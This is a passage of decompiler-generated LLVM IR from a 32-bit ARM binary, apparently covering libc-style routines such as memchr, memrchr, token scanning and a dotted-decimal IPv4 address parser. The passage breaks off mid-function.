dec_label_pc_12458:                               ; preds = %dec_label_pc_12430, %dec_label_pc_12450
  %v0_12444 = phi i32 [ %v1_12444, %dec_label_pc_12450 ], [ %v0_1245018, %dec_label_pc_12430 ]
  %.021 = phi i8* [ %v3_1244c, %dec_label_pc_12450 ], [ undef, %dec_label_pc_12430 ]
  %v1_12458 = ptrtoint i8* %.021 to i32
  %v2_12458 = urem i32 %v1_12458, 4
  %v3_12458 = icmp eq i32 %v2_12458, 0
  br i1 %v3_12458, label %dec_label_pc_12460, label %dec_label_pc_1243c

dec_label_pc_12460:                               ; preds = %dec_label_pc_12450, %dec_label_pc_12458, %dec_label_pc_12430
  %v0_124ec37 = phi i32 [ 0, %dec_label_pc_12430 ], [ 0, %dec_label_pc_12450 ], [ %v0_12444, %dec_label_pc_12458 ]
  %.0.lcssa = phi i8* [ undef, %dec_label_pc_12430 ], [ %v3_1244c, %dec_label_pc_12450 ], [ %.021, %dec_label_pc_12458 ]
  %v4_12460 = mul nuw nsw i32 %v1_12434, 256
  %v5_12460 = or i32 %v4_12460, %v1_12434
  %v1_12464 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_12464, i32* @ip, align 4
  %v4_12468 = mul i32 %v5_12460, 65536
  %v5_12468 = or i32 %v4_12468, %v5_12460
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_124ec37, 3
  br i1 %tmp, label %dec_label_pc_12470, label %dec_label_pc_12514.preheader

dec_label_pc_12470:                               ; preds = %dec_label_pc_12460, %dec_label_pc_124ec.backedge
  %v0_1248c82 = phi i32 [ %v1_1248c, %dec_label_pc_124ec.backedge ], [ %v0_124ec37, %dec_label_pc_12460 ]
  %v0_1247081 = phi i32 [ %v4_12470, %dec_label_pc_124ec.backedge ], [ %v1_12464, %dec_label_pc_12460 ]
  %v1_12470 = inttoptr i32 %v0_1247081 to i32*
  %v2_12470 = load i32, i32* %v1_12470, align 4
  %v4_12470 = add i32 %v0_1247081, 4
  store i32 %v4_12470, i32* @ip, align 4
  %v2_12474 = xor i32 %v2_12470, %v5_12468
  %v2_12478 = add i32 %v2_12474, 2130640639
  %v1_1247c = sub i32 -1, %v2_12474
  %v2_12480 = xor i32 %v2_12478, %v1_1247c
  %v2_12484 = and i32 %v2_12480, -2130640640
  %v2_12488 = icmp eq i32 %v2_12484, 0
  %v1_1248c = add i32 %v0_1248c82, -4
  br i1 %v2_12488, label %dec_label_pc_124ec.backedge, label %dec_label_pc_12494

dec_label_pc_124ec.backedge:                      ; preds = %dec_label_pc_12470, %dec_label_pc_124d8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1248c, 3
  br i1 %tmp107, label %dec_label_pc_12470, label %dec_label_pc_12514.preheader

dec_label_pc_12494:                               ; preds = %dec_label_pc_12470
  %v2_12494 = inttoptr i32 %v0_1247081 to i8*
  %v3_12494 = load i8, i8* %v2_12494, align 1
  %v4_12494 = zext i8 %v3_12494 to i32
  %v9_1249c = icmp eq i32 %v4_12494, %v1_12434
  %v1_124a0 = add i32 %v0_1247081, 3
  %v1_124a4 = add i32 %v0_1247081, 1
  store i32 %v1_124a4, i32* @lr, align 4
  %v1_124a8 = add i32 %v0_1247081, 2
  br i1 %v9_1249c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_12494
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 %v0_1247081

bb51:                                             ; preds = %dec_label_pc_12494
  %v2_124b0 = inttoptr i32 %v1_124a4 to i8*
  %v3_124b0 = load i8, i8* %v2_124b0, align 1
  %v4_124b0 = zext i8 %v3_124b0 to i32
  %v9_124b4 = icmp eq i32 %v4_124b0, %v1_12434
  br i1 %v9_124b4, label %dec_label_pc_124bc, label %dec_label_pc_124c4

dec_label_pc_124bc:                               ; preds = %bb51
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 %v1_124a4

dec_label_pc_124c4:                               ; preds = %bb51
  %v2_124c4 = inttoptr i32 %v1_124a8 to i8*
  %v3_124c4 = load i8, i8* %v2_124c4, align 1
  %v4_124c4 = zext i8 %v3_124c4 to i32
  %v9_124c8 = icmp eq i32 %v4_124c4, %v1_12434
  br i1 %v9_124c8, label %dec_label_pc_124d0, label %dec_label_pc_124d8

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c4
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 %v1_124a8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124c4
  %v2_124d8 = inttoptr i32 %v1_124a0 to i8*
  %v3_124d8 = load i8, i8* %v2_124d8, align 1
  %v4_124d8 = zext i8 %v3_124d8 to i32
  %v9_124dc = icmp eq i32 %v4_124d8, %v1_12434
  br i1 %v9_124dc, label %dec_label_pc_124e4, label %dec_label_pc_124ec.backedge

dec_label_pc_124e4:                               ; preds = %dec_label_pc_124d8
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 %v1_124a0

dec_label_pc_12514.preheader:                     ; preds = %dec_label_pc_124ec.backedge, %dec_label_pc_12460
  %v0_12470.lcssa = phi i32 [ %v1_12464, %dec_label_pc_12460 ], [ %v4_12470, %dec_label_pc_124ec.backedge ]
  %v0_1248c.lcssa = phi i32 [ %v0_124ec37, %dec_label_pc_12460 ], [ %v1_1248c, %dec_label_pc_124ec.backedge ]
  %v2_1251411 = icmp eq i32 %v0_1248c.lcssa, 0
  br i1 %v2_1251411, label %dec_label_pc_1251c, label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %dec_label_pc_12514, %dec_label_pc_12514.preheader
  %v0_12514.in = phi i32 [ %v0_12514, %dec_label_pc_12514 ], [ %v0_1248c.lcssa, %dec_label_pc_12514.preheader ]
  %v15_1250c = phi i32 [ %v1_12510, %dec_label_pc_12514 ], [ %v0_12470.lcssa, %dec_label_pc_12514.preheader ]
  %v0_12514 = add i32 %v0_12514.in, -1
  %v1_12504 = inttoptr i32 %v15_1250c to i8*
  %v2_12504 = load i8, i8* %v1_12504, align 1
  %v3_12504 = zext i8 %v2_12504 to i32
  %v9_12508 = icmp eq i32 %v3_12504, %v1_12434
  br i1 %v9_12508, label %bb52, label %dec_label_pc_12514

bb52:                                             ; preds = %dec_label_pc_12504
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 %v15_1250c

dec_label_pc_12514:                               ; preds = %dec_label_pc_12504
  %v1_12510 = add i32 %v15_1250c, 1
  %v2_12514 = icmp eq i32 %v0_12514, 0
  br i1 %v2_12514, label %dec_label_pc_1251c, label %dec_label_pc_12504

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12514, %dec_label_pc_12514.preheader
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1250c, { 1, 0, 2 }
  uselistorder i32 %v1_1248c, { 1, 0, 2 }
  uselistorder i32 %v4_12470, { 0, 2, 1 }
  uselistorder i32 %v0_1247081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_12460, { 1, 0 }
  uselistorder i32 %v0_124ec37, { 1, 2, 0 }
  uselistorder i32 %v1_12434, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_12430, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_124ec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12470, { 1, 0 }
  uselistorder label %dec_label_pc_12460, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
}

define i32 @function_1252c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1252c:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_12538 = call i32 @function_ec10()
  %v0_1253c = load i32, i32* @r5, align 4
  %v1_1253c = load i32, i32* @r4, align 4
  %v2_1253c = add i32 %v1_1253c, %v0_1253c
  ret i32 %v2_1253c
}

define i32 @function_12544(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12544:
  %v3_12544 = load i32, i32* @r4, align 4
  %v1_12548 = urem i32 %arg2, 256
  %v2_1254c = add i32 %arg3, %arg1
  %v2_125642 = icmp eq i32 %arg3, 0
  br i1 %v2_125642, label %dec_label_pc_12574, label %dec_label_pc_1256c

dec_label_pc_12554:                               ; preds = %dec_label_pc_1256c
  %v1_12554 = add i32 %v0_12554, -1
  %v2_12554 = inttoptr i32 %v1_12554 to i8*
  %v3_12554 = load i8, i8* %v2_12554, align 1
  %v4_12554 = zext i8 %v3_12554 to i32
  %v9_12558 = icmp eq i32 %v4_12554, %v1_12548
  br i1 %v9_12558, label %bb, label %dec_label_pc_12564

bb:                                               ; preds = %dec_label_pc_12554
  ret i32 %v1_12554

dec_label_pc_12564:                               ; preds = %dec_label_pc_12554
  %v1_12560 = add i32 %v0_12560, -1
  %v2_12564 = icmp eq i32 %v1_12560, 0
  br i1 %v2_12564, label %dec_label_pc_12574, label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %dec_label_pc_12544, %dec_label_pc_12564
  %v0_12560 = phi i32 [ %v1_12560, %dec_label_pc_12564 ], [ %arg3, %dec_label_pc_12544 ]
  %v0_12554 = phi i32 [ %v1_12554, %dec_label_pc_12564 ], [ %v2_1254c, %dec_label_pc_12544 ]
  %v1_1256c = urem i32 %v0_12554, 4
  %v2_1256c = icmp eq i32 %v1_1256c, 0
  br i1 %v2_1256c, label %dec_label_pc_12574, label %dec_label_pc_12554

dec_label_pc_12574:                               ; preds = %dec_label_pc_12564, %dec_label_pc_1256c, %dec_label_pc_12544
  %v0_1260c11 = phi i32 [ %v2_1254c, %dec_label_pc_12544 ], [ %v1_12554, %dec_label_pc_12564 ], [ %v0_12554, %dec_label_pc_1256c ]
  %v0_125f87 = phi i32 [ 0, %dec_label_pc_12544 ], [ 0, %dec_label_pc_12564 ], [ %v0_12560, %dec_label_pc_1256c ]
  %v4_12574 = mul nuw nsw i32 %v1_12548, 256
  %v5_12574 = or i32 %v4_12574, %v1_12548
  %v4_12578 = mul i32 %v5_12574, 65536
  %v5_12578 = or i32 %v4_12578, %v5_12574
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_125f87, 3
  br i1 %tmp, label %dec_label_pc_12580, label %dec_label_pc_12608

dec_label_pc_12580:                               ; preds = %dec_label_pc_12574, %.backedge.backedge
  %v0_1259c51 = phi i32 [ %v1_1259c, %.backedge.backedge ], [ %v0_125f87, %dec_label_pc_12574 ]
  %v0_1258050 = phi i32 [ %v1_12580, %.backedge.backedge ], [ %v0_1260c11, %dec_label_pc_12574 ]
  %v1_12580 = add i32 %v0_1258050, -4
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  %v2_12584 = xor i32 %v3_12580, %v5_12578
  %v2_12588 = add i32 %v2_12584, 2130640639
  %v1_1258c = sub i32 -1, %v2_12584
  %v2_12590 = xor i32 %v2_12588, %v1_1258c
  %v2_12594 = and i32 %v2_12590, -2130640640
  %v2_12598 = icmp eq i32 %v2_12594, 0
  %v1_1259c = add i32 %v0_1259c51, -4
  br i1 %v2_12598, label %.backedge.backedge, label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %dec_label_pc_12580
  %v1_125a4 = add i32 %v0_1258050, -1
  %v2_125a4 = inttoptr i32 %v1_125a4 to i8*
  %v3_125a4 = load i8, i8* %v2_125a4, align 1
  %v4_125a4 = zext i8 %v3_125a4 to i32
  %v9_125a8 = icmp eq i32 %v4_125a4, %v1_12548
  %v1_125ac = add i32 %v0_1258050, -2
  store i32 %v1_125ac, i32* @ip, align 4
  %v1_125b4 = add i32 %v0_1258050, -3
  store i32 %v1_125b4, i32* @lr, align 4
  br i1 %v9_125a8, label %dec_label_pc_125bc, label %dec_label_pc_125c4

dec_label_pc_125bc:                               ; preds = %dec_label_pc_125a4
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 %v1_125a4

dec_label_pc_125c4:                               ; preds = %dec_label_pc_125a4
  %v2_125c4 = inttoptr i32 %v1_125ac to i8*
  %v3_125c4 = load i8, i8* %v2_125c4, align 1
  %v4_125c4 = zext i8 %v3_125c4 to i32
  %v9_125c8 = icmp eq i32 %v4_125c4, %v1_12548
  br i1 %v9_125c8, label %dec_label_pc_125d0, label %dec_label_pc_125d8

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125c4
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 %v1_125ac

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125c4
  %v2_125d8 = inttoptr i32 %v1_125b4 to i8*
  %v3_125d8 = load i8, i8* %v2_125d8, align 1
  %v4_125d8 = zext i8 %v3_125d8 to i32
  %v9_125dc = icmp eq i32 %v4_125d8, %v1_12548
  br i1 %v9_125dc, label %dec_label_pc_125e4, label %dec_label_pc_125ec

dec_label_pc_125e4:                               ; preds = %dec_label_pc_125d8
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 %v1_125b4

dec_label_pc_125ec:                               ; preds = %dec_label_pc_125d8
  %v1_125ec = inttoptr i32 %v1_12580 to i8*
  %v2_125ec = load i8, i8* %v1_125ec, align 1
  %v3_125ec = zext i8 %v2_125ec to i32
  %v9_125f0 = icmp eq i32 %v3_125ec, %v1_12548
  br i1 %v9_125f0, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_125ec, %dec_label_pc_12580
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1259c, 3
  br i1 %tmp70, label %dec_label_pc_12580, label %dec_label_pc_12608

bb19:                                             ; preds = %dec_label_pc_125ec
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 %v1_12580

dec_label_pc_1260c:                               ; preds = %dec_label_pc_12608
  %v1_12618 = add i32 %v0_12618, -1
  %v1_1260c = add i32 %v0_1260c, -1
  %v2_1260c = inttoptr i32 %v1_1260c to i8*
  %v3_1260c = load i8, i8* %v2_1260c, align 1
  %v4_1260c = zext i8 %v3_1260c to i32
  %v9_12610 = icmp eq i32 %v4_1260c, %v1_12548
  br i1 %v9_12610, label %bb20, label %dec_label_pc_12608

bb20:                                             ; preds = %dec_label_pc_1260c
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 %v1_1260c

dec_label_pc_12608:                               ; preds = %dec_label_pc_12574, %.backedge.backedge, %dec_label_pc_1260c
  %v0_1260c = phi i32 [ %v1_1260c, %dec_label_pc_1260c ], [ %v0_1260c11, %dec_label_pc_12574 ], [ %v1_12580, %.backedge.backedge ]
  %v0_12618 = phi i32 [ %v1_12618, %dec_label_pc_1260c ], [ %v0_125f87, %dec_label_pc_12574 ], [ %v1_1259c, %.backedge.backedge ]
  %v2_12618 = icmp eq i32 %v0_12618, 0
  br i1 %v2_12618, label %dec_label_pc_12620, label %dec_label_pc_1260c

dec_label_pc_12620:                               ; preds = %dec_label_pc_12608
  store i32 %v3_12544, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12618, { 1, 0 }
  uselistorder i32 %v1_1259c, { 1, 0, 2 }
  uselistorder i32 %v1_12580, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1258050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_12574, { 1, 0 }
  uselistorder i32 %v0_125f87, { 1, 2, 0 }
  uselistorder i32 %v0_12554, { 1, 0, 2 }
  uselistorder i32 %v1_12554, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1254c, { 1, 0 }
  uselistorder i32 %v1_12548, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_12544, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12608, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12580, { 1, 0 }
  uselistorder label %dec_label_pc_12574, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1256c, { 1, 0 }
}

define i32 @function_12630() local_unnamed_addr {
dec_label_pc_12630:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12630 = load i32, i32* @r4, align 4
  store i32 %v3_12630, i32* %stack_var_-16, align 4
  %v6_12630 = load i32, i32* @r5, align 4
  %v0_12634 = load i32, i32* @r0, align 4
  store i32 %v0_12634, i32* %r4.global-to-local, align 4
  %v2_12634 = icmp eq i32 %v0_12634, 0
  %v1_12638 = load i32, i32* @r2, align 4
  br i1 %v2_12634, label %bb, label %dec_label_pc_12630._crit_edge

bb:                                               ; preds = %dec_label_pc_12630
  %v2_12638 = inttoptr i32 %v1_12638 to i32*
  %v3_12638 = load i32, i32* %v2_12638, align 4
  store i32 %v3_12638, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12630._crit_edge

dec_label_pc_12630._crit_edge:                    ; preds = %dec_label_pc_12630, %bb
  %v0_1263c = phi i32 [ %v3_12638, %bb ], [ %v0_12634, %dec_label_pc_12630 ]
  store i32 %v0_1263c, i32* @r0, align 4
  store i32 %v1_12638, i32* @r5, align 4
  %v0_12644 = load i32, i32* @r1, align 4
  store i32 %v0_12644, i32* %r6.global-to-local, align 4
  %v1_12648 = inttoptr i32 %v0_1263c to i8*
  %v2_12648 = call i32 @function_13970(i8* %v1_12648)
  %v0_1264c = load i32, i32* %r4.global-to-local, align 4
  %v2_1264c = add i32 %v0_1264c, %v2_12648
  %v3_1264c = inttoptr i32 %v2_1264c to i8*
  %v4_1264c = load i8, i8* %v3_1264c, align 1
  %v6_1264c = zext i8 %v4_1264c to i32
  store i32 %v6_1264c, i32* %r3.global-to-local, align 4
  store i32 %v2_1264c, i32* @r4, align 4
  %v2_12654 = icmp eq i8 %v4_1264c, 0
  store i1 %v2_12654, i1* @cpsr_z, align 1
  %v0_12658 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12658, i32* @r1, align 4
  store i32 %v2_1264c, i32* @r0, align 4
  br i1 %v2_12654, label %bb7, label %dec_label_pc_12668

bb7:                                              ; preds = %dec_label_pc_12630._crit_edge
  %v2_12660 = load i32, i32* @r5, align 4
  %v3_12660 = inttoptr i32 %v2_12660 to i32*
  store i32 %v2_1264c, i32* %v3_12660, align 4
  br label %dec_label_pc_1269c

dec_label_pc_12668:                               ; preds = %dec_label_pc_12630._crit_edge
  %v0_12668 = call i32 @function_126a4()
  store i32 %v0_12668, i32* %r2.global-to-local, align 4
  %v3_1266c = icmp eq i32 %v0_12668, 0
  store i1 %v3_1266c, i1* @cpsr_z, align 1
  br i1 %v3_1266c, label %dec_label_pc_1267c, label %dec_label_pc_1268c

dec_label_pc_1267c:                               ; preds = %dec_label_pc_12668
  %v0_12674 = load i32, i32* @r4, align 4
  %v2_1267c = call i32 @function_137f0(i32 %v0_12674, i32 0)
  %v0_12680 = load i32, i32* @r4, align 4
  store i32 %v0_12680, i32* %r3.global-to-local, align 4
  %v1_12684 = load i32, i32* @r5, align 4
  %v2_12684 = inttoptr i32 %v1_12684 to i32*
  store i32 %v2_1267c, i32* %v2_12684, align 4
  br label %dec_label_pc_1269c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12668
  %v3_12690 = inttoptr i32 %v0_12668 to i8*
  store i8 0, i8* %v3_12690, align 1
  %v4_12690 = load i32, i32* %r2.global-to-local, align 4
  %v5_12690 = add i32 %v4_12690, 1
  store i32 %v5_12690, i32* %r2.global-to-local, align 4
  %v1_12694 = load i32, i32* @r5, align 4
  %v2_12694 = inttoptr i32 %v1_12694 to i32*
  store i32 %v5_12690, i32* %v2_12694, align 4
  %v0_12698 = load i32, i32* @r4, align 4
  store i32 %v0_12698, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1269c

dec_label_pc_1269c:                               ; preds = %bb7, %dec_label_pc_1267c, %dec_label_pc_1268c
  %v0_1269c = load i32, i32* %r3.global-to-local, align 4
  %v2_126a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_126a0, i32* @r4, align 4
  store i32 %v6_12630, i32* @r5, align 4
  ret i32 %v0_1269c

; uselistorder directives
  uselistorder i32 %v0_1263c, { 1, 0 }
  uselistorder i32 %v0_12634, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1269c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12630._crit_edge, { 1, 0 }
}

define i32 @function_126a4() local_unnamed_addr {
dec_label_pc_126a4:
  %v0_126a4 = load i32, i32* @r0, align 4
  %v1_126c82 = inttoptr i32 %v0_126a4 to i8*
  %v2_126c83 = load i8, i8* %v1_126c82, align 1
  %v3_126c84 = zext i8 %v2_126c83 to i32
  %v2_126cc5 = icmp eq i8 %v2_126c83, 0
  br i1 %v2_126cc5, label %dec_label_pc_126c8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_126a4
  %v0_126d4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_126ac:                               ; preds = %dec_label_pc_126b4
  %v1_126bc = add i32 %v0_126bc, 1
  %v9_126ac = icmp eq i32 %v3_126b4, %v3_126c86
  br i1 %v9_126ac, label %dec_label_pc_126dc, label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126ac, %bb
  %v0_126bc = phi i32 [ %v1_126bc, %dec_label_pc_126ac ], [ %v0_126d4.pre, %bb ]
  %v1_126b4 = inttoptr i32 %v0_126bc to i8*
  %v2_126b4 = load i8, i8* %v1_126b4, align 1
  %v3_126b4 = zext i8 %v2_126b4 to i32
  store i32 %v3_126b4, i32* @ip, align 4
  %v2_126b8 = icmp eq i8 %v2_126b4, 0
  br i1 %v2_126b8, label %dec_label_pc_126c4, label %dec_label_pc_126ac

dec_label_pc_126c4:                               ; preds = %dec_label_pc_126b4
  %v1_126c4 = add i32 %v0_126c4, 1
  %v1_126c8 = inttoptr i32 %v1_126c4 to i8*
  %v2_126c8 = load i8, i8* %v1_126c8, align 1
  %v3_126c8 = zext i8 %v2_126c8 to i32
  %v2_126cc = icmp eq i8 %v2_126c8, 0
  br i1 %v2_126cc, label %dec_label_pc_126c8._crit_edge, label %bb

dec_label_pc_126c8._crit_edge:                    ; preds = %dec_label_pc_126c4, %dec_label_pc_126a4
  %v3_126c8.lcssa = phi i32 [ %v3_126c84, %dec_label_pc_126a4 ], [ %v3_126c8, %dec_label_pc_126c4 ]
  ret i32 %v3_126c8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_126c4
  %v0_126c4 = phi i32 [ %v0_126a4, %.lr.ph ], [ %v1_126c4, %dec_label_pc_126c4 ]
  %v3_126c86 = phi i32 [ %v3_126c84, %.lr.ph ], [ %v3_126c8, %dec_label_pc_126c4 ]
  br label %dec_label_pc_126b4

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126ac
  ret i32 %v0_126c4

; uselistorder directives
  uselistorder i32 %v3_126c8, { 1, 0 }
  uselistorder i32 %v3_126b4, { 1, 0 }
  uselistorder i32 %v0_126bc, { 1, 0 }
  uselistorder i32 %v3_126c84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_126b4, { 1, 0 }
}

define i32 @function_126e4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_126e4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_126e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_126e4 = icmp eq i32 %v0_126e4, 0
  %v3_126e8 = load i32, i32* @r4, align 4
  store i32 %v3_126e8, i32* %stack_var_-20, align 4
  br i1 %v2_126e4, label %dec_label_pc_127c4, label %dec_label_pc_12700.lr.ph

dec_label_pc_12700:                               ; preds = %dec_label_pc_12700.lr.ph, %dec_label_pc_12784
  %v1_12784 = phi i32 [ 0, %dec_label_pc_12700.lr.ph ], [ %v5_12784, %dec_label_pc_12784 ]
  %v0_12788 = phi i32 [ 1, %dec_label_pc_12700.lr.ph ], [ %v1_12788, %dec_label_pc_12784 ]
  %v0_12708 = phi i32 [ %v0_126e4, %dec_label_pc_12700.lr.ph ], [ %v0_1270825, %dec_label_pc_12784 ]
  store i32 %v2_12704.pre, i32* @lr, align 4
  %v1_12708 = inttoptr i32 %v0_12708 to i8*
  %v2_12708 = load i8, i8* %v1_12708, align 1
  %v3_12708 = zext i8 %v2_12708 to i32
  %v3_1270c = mul nuw nsw i32 %v3_12708, 2
  %v4_1270c = add i32 %v3_1270c, %v2_12704.pre
  %v5_1270c = inttoptr i32 %v4_1270c to i8*
  %v6_1270c = load i8, i8* %v5_1270c, align 1
  %v1_12710 = and i8 %v6_1270c, 8
  %v2_12710 = icmp eq i8 %v1_12710, 0
  br i1 %v2_12710, label %dec_label_pc_127c4, label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %dec_label_pc_12700
  br label %dec_label_pc_12738

dec_label_pc_12720:                               ; preds = %dec_label_pc_12738
  %v3_12724 = mul i32 %v0_12784, 10
  %v4_12724 = add i32 %v3_12738, %v3_12724
  %v1_12728 = add i32 %v4_12724, -48
  %v8_12730 = icmp sgt i32 %v1_12728, 255
  br i1 %v8_12730, label %dec_label_pc_127c4, label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_12720
  %v1_12734 = add i32 %v0_12774, 1
  store i32 %v1_12734, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %dec_label_pc_12718, %dec_label_pc_12734
  %v0_12784 = phi i32 [ 0, %dec_label_pc_12718 ], [ %v1_12728, %dec_label_pc_12734 ]
  %v0_12774 = phi i32 [ %v0_12708, %dec_label_pc_12718 ], [ %v1_12734, %dec_label_pc_12734 ]
  %v1_12738 = inttoptr i32 %v0_12774 to i8*
  %v2_12738 = load i8, i8* %v1_12738, align 1
  %v3_12738 = zext i8 %v2_12738 to i32
  %v2_1273c = mul nuw nsw i32 %v3_12738, 2
  %v2_12740 = add i32 %v2_1273c, %v2_12704.pre
  %v3_12744 = inttoptr i32 %v2_12740 to i8*
  %v4_12744 = load i8, i8* %v3_12744, align 1
  %v6_12744 = zext i8 %v4_12744 to i32
  %v1_12750 = and i32 %v6_12744, 8
  %v2_12750 = icmp eq i32 %v1_12750, 0
  br i1 %v2_12750, label %dec_label_pc_12758, label %dec_label_pc_12720

dec_label_pc_12758:                               ; preds = %dec_label_pc_12738
  %v8_1275c = icmp sgt i32 %v0_12788, 3
  br i1 %v8_1275c, label %dec_label_pc_12770, label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %dec_label_pc_12758
  %v7_12760 = icmp eq i8 %v2_12738, 46
  br i1 %v7_12760, label %dec_label_pc_12768, label %dec_label_pc_127c4

dec_label_pc_12768:                               ; preds = %dec_label_pc_12760
  %v1_12768 = add i32 %v0_12774, 1
  store i32 %v1_12768, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12784

dec_label_pc_12770:                               ; preds = %dec_label_pc_12758
  %v2_12770 = icmp eq i8 %v2_12738, 0
  %v1_12774 = add i32 %v0_12774, 1
  store i32 %v1_12774, i32* %r0.global-to-local, align 4
  br i1 %v2_12770, label %dec_label_pc_12784, label %dec_label_pc_1277c

dec_label_pc_1277c:                               ; preds = %dec_label_pc_12770
  %v1_1277c = and i32 %v6_12744, 32
  %v2_1277c = icmp eq i32 %v1_1277c, 0
  br i1 %v2_1277c, label %dec_label_pc_127c4, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_1277c, %dec_label_pc_12770, %dec_label_pc_12768
  %v0_1270825 = phi i32 [ %v1_12774, %dec_label_pc_1277c ], [ %v1_12774, %dec_label_pc_12770 ], [ %v1_12768, %dec_label_pc_12768 ]
  %v4_12784 = mul i32 %v1_12784, 256
  %v5_12784 = or i32 %v0_12784, %v4_12784
  %v1_12788 = add nuw nsw i32 %v0_12788, 1
  %v7_12790 = icmp slt i32 %v1_12788, 5
  br i1 %v7_12790, label %dec_label_pc_12700, label %dec_label_pc_12794

dec_label_pc_12700.lr.ph:                         ; preds = %dec_label_pc_126e4
  %v2_12704.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_12700

dec_label_pc_12794:                               ; preds = %dec_label_pc_12784
  %v2_12794 = icmp eq i32 %arg2, 0
  br i1 %v2_12794, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_12794
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_12794
  %v3_127b0 = call i32 @llvm.bswap.i32(i32 %v5_12784)
  store i32 1, i32* %r0.global-to-local, align 4
